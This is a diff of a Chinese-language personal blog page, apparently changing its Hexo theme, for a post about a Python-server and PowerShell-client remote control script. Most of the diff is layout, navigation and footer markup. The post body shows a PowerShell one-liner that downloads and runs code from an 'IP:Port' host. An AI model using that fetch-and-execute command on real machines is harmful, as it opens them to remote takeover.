@@ -1,174 +1,271 @@
 <!DOCTYPE html>
-<html lang="">
-  <head>
-    <meta charset="UTF-8"/>
-<meta http-equiv="X-UA-Compatible" content="IE=edge" />
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<html>
 
-
-<meta http-equiv="Cache-Control" content="no-transform" />
-<meta http-equiv="Cache-Control" content="no-siteapp" />
-
-
-
-  <meta name="description" content="Python+PowerShell 一句话远控脚本思路"/>
-
-
-
-
-  <meta name="keywords" content="python,powershell,hacker," />
-
-
-
-
-  <link rel="alternative" href="/atom.xml" title="woostundy" type="application/atom+xml">
-
-
-
-
-  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=2.0.0" />
-
-
-
-<link rel="canonical" href="http://woostundy.github.io/2015/08/26/Python-PowerShell-一句话远控脚本思路/"/>
-
-
-<link rel="stylesheet" type="text/css" href="/css/style.css?v=2.0.0" />
-
-
+<head>
+  <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+  <title>Python+PowerShell 一句话远控脚本思路 | woostundy</title>
+  <meta name="description" content="about woody" />
+  <meta name="HandheldFriendly" content="True" />
+  <meta name="MobileOptimized" content="320" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="stylesheet" type="text/css" href="/css/component.css" />
+  <link rel="stylesheet" type="text/css" href="/css/screen.css" />
+  <meta name="generator" content="woostundy">
+  
+  
+  
 
   
 
+<!-- mathjax config similar to math.stackexchange -->
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
+      processEscapes: true
+    }
+  });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      tex2jax: {
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+      }
+    });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script type="text/javascript" src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+</head>
+<body>
+<div class="container">
+    <div class="mp-pusher" id="mp-pusher">
+        <i id="scroll-up" class="fa fa-angle-up"></i>
+        <nav id="mp-menu" class="mp-menu">
+            <div class="mp-level">
+                <a data-pjax class="back-home" style="font-size: 20px" href="/"><h2 ><i class="fa fa-home"></i>
+                        Home</h2></a>
+                <ul class="first-level">
+                    <li>
+                        <a class="fa fa-archive" href="#"><i class="fa fa-angle-left">
+                            </i>&nbsp;&nbsp;Archive</a>
+                        <div class="mp-level page-list">
+                            <h2 ><i class="fa fa-archive"></i>
+                                Archive</h2>
+                            <a class="mp-back" href="#">back</a>
+                            <form id="search-form" action="">
+                                <input type="text" class="search search-archive" placeholder="Search.."/>
+                            </form>
+                            <ul>
+                                <div class="mp-scroll">
+                                
+                                <li class="search-archive-li mp-pjax">
+                                    <a href="/2016/12/12/两个局域网怎么互连？一个简单解决方案/">两个局域网怎么互连？一个简单解决方案</a>
+                                </li>
+                                
+                                <li class="search-archive-li mp-pjax">
+                                    <a href="/2016/11/15/梁山神算子算天机-江州黄通判通地孤/">梁山神算子算天机 江州黄通判通地孤</a>
+                                </li>
+                                
+                                <li class="search-archive-li mp-pjax">
+                                    <a href="/2016/07/16/常见加密算法简介/">常见加密算法简介</a>
+                                </li>
+                                
+                                <li class="search-archive-li mp-pjax">
+                                    <a href="/2016/07/15/Apache2自签发V3证书详细流程/">Apache2 设置自签发证书</a>
+                                </li>
+                                
+                                <li class="search-archive-li mp-pjax">
+                                    <a href="/2016/03/08/详解HTTP细节-1/">详解HTTP细节 1</a>
+                                </li>
+                                
+                                <li class="search-archive-li mp-pjax">
+                                    <a href="/2016/03/04/详解URL细节/">详解URL细节</a>
+                                </li>
+                                
+                                <li class="search-archive-li mp-pjax">
+                                    <a href="/2016/02/24/Some Tips/">Some Tips</a>
+                                </li>
+                                
+                                <li class="search-archive-li mp-pjax">
+                                    <a href="/2015/10/22/PowerShell XML处理、注册表Default取值坑两则/">PowerShell XML处理和注册表(Default)取值 坑两则</a>
+                                </li>
+                                
+                                <li class="search-archive-li mp-pjax">
+                                    <a href="/2015/10/22/PowerShell-判断操作系统语言等信息/">PowerShell 判断操作系统语言</a>
+                                </li>
+                                
+                                <li class="search-archive-li mp-pjax">
+                                    <a href="/2015/10/20/PowerShell入门系列3基本语法/">PowerShell入门系列3基本语法</a>
+                                </li>
+                                
+                                <li class="search-archive-li mp-pjax">
+                                    <a href="/2015/10/09/PowerShell学习资料整理/">PowerShell学习资料整理</a>
+                                </li>
+                                
+                                <li class="search-archive-li mp-pjax">
+                                    <a href="/2015/10/09/PowerShell入门系列2-cmdlet/">PowerShell入门系列2:cmdlet</a>
+                                </li>
+                                
+                                <li class="search-archive-li mp-pjax">
+                                    <a href="/2015/09/21/Skill-List/">Skill List</a>
+                                </li>
+                                
+                                <li class="search-archive-li mp-pjax">
+                                    <a href="/2015/09/11/Powershell入门系列1-介绍和开始/">PowerShell入门系列1：介绍和快速开始</a>
+                                </li>
+                                
+                                <li class="search-archive-li mp-pjax">
+                                    <a href="/2015/09/08/深入理解JS笔记 1：数据类型Tips/">深入理解JS笔记 1：数据类型Tips</a>
+                                </li>
+                                
+                                <li class="search-archive-li mp-pjax">
+                                    <a href="/2015/08/26/Python-PowerShell-一句话远控脚本思路/">Python+PowerShell 一句话远控脚本思路</a>
+                                </li>
+                                
+                                </div>
+                            </ul>
+                        </div>
+                    </li>
+                    
+                    
+                    
+                    <li>
+                        <a class="fa fa-weibo" href="#"><i class="fa fa-angle-left"></i>&nbsp;&nbsp;Weibo Show</a>
+
+                        <div class="mp-level page-list">
+                            <h2 ><i class="fa fa-weibo"></i>
+                                Weibo Show</h2>
+                            <a class="mp-back" href="#">back</a>
+                        </div>
+                    </li>
+                    
+                    <li class="mp-pjax"><a class="fa fa-user" href="/about">&nbsp;&nbsp;&nbsp;About me</a></li>
+                    <li><a class="fa fa-github" href='http://github.com/woostundy'>&nbsp;&nbsp;&nbsp;Github</a></li>
+
+                </ul>
+
+            </div>
+        </nav>
+        <div id="pjax">
+            <div class="pjax-hidden" style="display: none">
+                
+                    <a  data-pjax href="/2016/12/12/两个局域网怎么互连？一个简单解决方案/">两个局域网怎么互连？一个简单解决方案</a>
+                
+                    <a  data-pjax href="/2016/11/15/梁山神算子算天机-江州黄通判通地孤/">梁山神算子算天机 江州黄通判通地孤</a>
+                
+                    <a  data-pjax href="/2016/07/16/常见加密算法简介/">常见加密算法简介</a>
+                
+                    <a  data-pjax href="/2016/07/15/Apache2自签发V3证书详细流程/">Apache2 设置自签发证书</a>
+                
+                    <a  data-pjax href="/2016/03/08/详解HTTP细节-1/">详解HTTP细节 1</a>
+                
+                    <a  data-pjax href="/2016/03/04/详解URL细节/">详解URL细节</a>
+                
+                    <a  data-pjax href="/2016/02/24/Some Tips/">Some Tips</a>
+                
+                    <a  data-pjax href="/2015/10/22/PowerShell XML处理、注册表Default取值坑两则/">PowerShell XML处理和注册表(Default)取值 坑两则</a>
+                
+                    <a  data-pjax href="/2015/10/22/PowerShell-判断操作系统语言等信息/">PowerShell 判断操作系统语言</a>
+                
+                    <a  data-pjax href="/2015/10/20/PowerShell入门系列3基本语法/">PowerShell入门系列3基本语法</a>
+                
+                    <a  data-pjax href="/2015/10/09/PowerShell学习资料整理/">PowerShell学习资料整理</a>
+                
+                    <a  data-pjax href="/2015/10/09/PowerShell入门系列2-cmdlet/">PowerShell入门系列2:cmdlet</a>
+                
+                    <a  data-pjax href="/2015/09/21/Skill-List/">Skill List</a>
+                
+                    <a  data-pjax href="/2015/09/11/Powershell入门系列1-介绍和开始/">PowerShell入门系列1：介绍和快速开始</a>
+                
+                    <a  data-pjax href="/2015/09/08/深入理解JS笔记 1：数据类型Tips/">深入理解JS笔记 1：数据类型Tips</a>
+                
+                    <a  data-pjax href="/2015/08/26/Python-PowerShell-一句话远控脚本思路/">Python+PowerShell 一句话远控脚本思路</a>
+                
+                
+                
+                    <a data-pjax href="/tags/JS/">&nbsp;&nbsp;JS</a>
+                
+                    <a data-pjax href="/tags/Linux/">&nbsp;&nbsp;Linux</a>
+                
+                    <a data-pjax href="/tags/PowerShell/">&nbsp;&nbsp;PowerShell</a>
+                
+                    <a data-pjax href="/tags/hacker/">&nbsp;&nbsp;hacker</a>
+                
+                    <a data-pjax href="/tags/other/">&nbsp;&nbsp;other</a>
+                
+                    <a data-pjax href="/tags/python-powershell-hacker/">&nbsp;&nbsp;python,powershell,hacker</a>
+                
+                    <a data-pjax href="/tags/加密/">&nbsp;&nbsp;加密</a>
+                
+                    <a data-pjax href="/tags/网络/">&nbsp;&nbsp;网络</a>
+                
+                <a data-pjax class="fa fa-user" href="/about">&nbsp;&nbsp;&nbsp;About me</a>
+            </div>
+            <nav class="nexus">
+                <li  style="border-left: 1px solid #c6d0da;">
+                    <a id="trigger" href="#"><i class="fa fa-bars"></i></a>
+                </li>
+                <li ><a id="nexus-back" data-pjax href="/">woostundy</a></li>
+                
+                <div id="nav-container">
+                    <div class="post-navbar" style="line-height: 63px;display:none">
+                        <li id="navbar-title"><a href="#">Python+PowerShell 一句话远控脚本思路</a></li>
+                        <li id="navbar-toc" style="border-left: none">
+                            <a style="padding-right: 15px">
+                                <span id="toc-content" >Introduction</span><i class="fa fa-chevron-down" ></i>
+                            </a>
+                            <div class="hidden-box">
+                                <ul id="toc"></ul>
+                            </div>
+                        </li>
+                    </div>
+                </div>
+                
+            </nav>
+
+            <div class="scroller">
+            <div class="scroller-inner">
 
 
-    <title> Python+PowerShell 一句话远控脚本思路 · woostundy </title>
-  </head>
-
-  <body>
-    <div class="container">
-      <header id="header" class="header"><div class="logo-wrapper">
-  <a href="/." class="logo">woostundy</a>
-</div>
-
-<nav class="site-nav">
+<!-- -->
+<!--<body class="post-template">-->
+<!---->
   
-    <ul id="menu" class="menu">
-      
-        
-        <li class="menu-item">
-          <a class="menu-item-link" href="/">
-            首页
-          </a>
-        </li>
-      
-        
-        <li class="menu-item">
-          <a class="menu-item-link" href="/archives/">
-            归档
-          </a>
-        </li>
-      
-        
-        <li class="menu-item">
-          <a class="menu-item-link" href="/tags">
-            标签
-          </a>
-        </li>
-      
-        
-        <li class="menu-item">
-          <a class="menu-item-link" href="/categories">
-            分类
-          </a>
-        </li>
-      
-        
-        <li class="menu-item">
-          <a class="menu-item-link" href="/about">
-            关于
-          </a>
-        </li>
-      
-      
-    </ul>
-  
-</nav>
 
-<div class="mobile-navbar">
-  <div class="mobile-header">
-    <div class="mobile-header-logo">
-      <a href="/." class="logo">woostundy</a>
-    </div>
+<main class="content" role="main">
+    <article class="post" >
+    <span class="post-meta">
+                  <div class="tag-tile">
+                      
+                      
+                      <a data-pjax href='/tags/python-powershell-hacker/' style='color:#D5D5D5'>python,powershell,hacker</a>
+                      
+                      
+                  </div>
+                <h1 class="post-title" style="margin: 14px 0;color:#50585D">Python+PowerShell 一句话远控脚本思路</h1>
 
-    <div class="mobile-header-icon">
-      <span></span>
-      <span></span>
-      <span></span>
-    </div>
-  </div>
-  <nav class="mobile-menu">
-    
-      
-      <a class="mobile-menu-item" href="/">
-        首页
-      </a>
-    
-      
-      <a class="mobile-menu-item" href="/archives/">
-        归档
-      </a>
-    
-      
-      <a class="mobile-menu-item" href="/tags">
-        标签
-      </a>
-    
-      
-      <a class="mobile-menu-item" href="/categories">
-        分类
-      </a>
-    
-      
-      <a class="mobile-menu-item" href="/about">
-        关于
-      </a>
-    
-  </nav>
-</div>
-      </header>
+                    <div class="post-meta">
+                        Post on<span class="fa fa-clock-o"></span>
+                        <time datetime="2015-08-26T07:59:26.000Z"
+                              itemprop="datePublished">2015-08-26</time>
+                    </div>
+    </span>
 
-      <main id="main" class="main">
-        <div class="content-wrapper">
-          <div id="content" class="content">
-            
-  
-  <article class="post">
-    <header class="post-header">
-      <h1 class="post-title">
-        
-          Python+PowerShell 一句话远控脚本思路
-        
-      </h1>
-
-      <div class="post-meta">
-        <span class="post-time">
-          Aug 26, 2015
-        </span>
-      </div>
-    </header>
-
-    
-      <div class="post-toc" id="post-toc">
-        <h2 class="post-toc-title">文章目录</h2>
-        <div class="post-toc-content">
-          <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#简介"><span class="toc-text">简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#原理"><span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#TODO"><span class="toc-text">TODO</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#代码"><span class="toc-text">代码</span></a></li></ol>
-        </div>
-      </div>
-    
-
-    <div class="post-content">
-      
-        <h2 id="简介">简介</h2><p>从Win7开始，Windows全部自带极其强大的Powershell，Windows的新利器！我之后会陆续写一些关于Powershell应用的文章。</p>
+        <section class="post-content">
+            <h2 id="简介">简介</h2><p>从Win7开始，Windows全部自带极其强大的Powershell，Windows的新利器！我之后会陆续写一些关于Powershell应用的文章。</p>
 <p>这是用Python写服务端，PowerShell写客户端，基于Socket的一个远控脚本。<br>其实Powershell也可以写服务端，选Python写服务端主要是为了在Linux服务器上也能跑。</p>
 <h2 id="原理">原理</h2><p><code>iex (New-Object Sys.Net.Webclient).DownloadString(&quot;http://IP:Port/connect&quot;)</code> </p>
 <ul>
@@ -312,118 +409,67 @@ allAddresses = []
 
 main()
 </code></pre>
-      
-    </div>
-
-    
-      <footer class="post-footer">
-        <div class="post-tags">
-          
-            <a href="/tags/python-powershell-hacker/">python,powershell,hacker</a>
-          
-        </div>
-
-        
-  <nav class="post-nav">
-    
-      <a class="prev" href="/2015/09/08/深入理解JS笔记 1：数据类型Tips/">
-        <i class="iconfont icon-left"></i>
-        <span class="prev-text nav-default">深入理解JS笔记 1：数据类型Tips</span>
-        <span class="prev-text nav-mobile">上一篇</span>
-      </a>
-    
-    
-  </nav>
-
-      </footer>
-    
-  </article>
+        </section>
+        <hr/>
+        <nav class="pagination" style="width:auto" role="pagination">
+            
+            <a data-pjax class="newer-posts" href="/2015/09/08/深入理解JS笔记 1：数据类型Tips/">← Prev Post</a>
+            
+            <a class="share-button" data-original-title title>Share this Post</a>
+            
+        </nav>
+        <section id="comment">
+            <div id="comment-box"></div>
+            
+        </section>
 
 
-          </div>
-          
-  <div class="comments" id="comments">
-    
-  </div>
-
-        </div>  
-      </main>
-
-      <footer id="footer" class="footer">
-  <div class="social-links">
-    
-      
-        
-          <a href="mailto:woostundy@gmail.com" class="iconfont icon-email" title="email"></a>
-        
-      
-    
-      
-    
-      
-    
-      
-    
-      
-    
-      
-        
-          <a href="http://www.weibo.com/woostundy" class="iconfont icon-weibo" title="weibo"></a>
-        
-      
-    
-      
-        
-          <a href="http://www.zhihu.com/people/shitao" class="iconfont icon-zhihu" title="zhihu"></a>
-        
-      
-    
-    
-    
-  </div>
+    </article>
+</main>
 
 
-<div class="copyright">
-  <span class="power-by">
-    由 <a class="hexo-link" href="https://hexo.io/">Hexo</a> 强力驱动
-  </span>
   
-  <span class="theme-info">
-    主题 - 
-    <a class="theme-link" href="https://github.com/ahonn/hexo-theme-even">Even</a>
-  </span>
-
-  <span class="copyright-year">
+<footer class="site-footer">
     
-    &copy; 
-     
-      2014 - 
-    
-    2017
-
-    <span class="heart">
-      <i class="iconfont icon-heart"></i>
-    </span>
-    <span class="author"></span>
-  </span>
-</div>
-      </footer>
-
-      <div class="back-to-top" id="back-to-top">
-        <i class="iconfont icon-up"></i>
-      </div>
+    <div class="inner">
+        <section class="copyright"><a href="/"></a> &copy; woostundy 2014</section>
+        <section class="poweredby">Published with <a target="_blank" href="http://hexo.io/">Hexo   </a> and Theme by <a target="_blank" href="https://github.com/yuche/hexo-theme-kael">Kael</a></section>
     </div>
+</footer>
+</div>
+</div><!-- /scroller -->
 
-    
+</div><!-- /pusher -->
+</div><!-- /container -->
+</div>
+
+<!-- Easter eggs -->
+
+<div class="egg animated">
+    <a id="close-button" href="#">X</a>
+    <div class="block">
+        <div class="loading">
+            <span class="ball1"></span>
+            <span class="ball2"></span>
+        </div>
+    </div>
+</div>
+  
+<script src="//cdn.staticfile.org/jquery/1.11.0/jquery.min.js"></script>
+<script>
+    if (!window.jQuery) {
+        var script = document.createElement('script');
+        script.src = "/js/jquery.min.js";
+        document.body.appendChild(script);
+    }
+</script>
+<script type="text/javascript" src="/js/lib.js"></script>
+<script type="text/javascript" src="/js/main.js"></script>
 
 
-    
 
 
-  <script type="text/javascript" src="/lib/jquery/jquery-3.1.1.min.js"></script>
 
-    <script type="text/javascript" src="/js/src/even.js?v=2.0.0"></script>
-<script type="text/javascript" src="/js/src/bootstrap.js?v=2.0.0"></script>
 
-  </body>
+</body>
 </html>
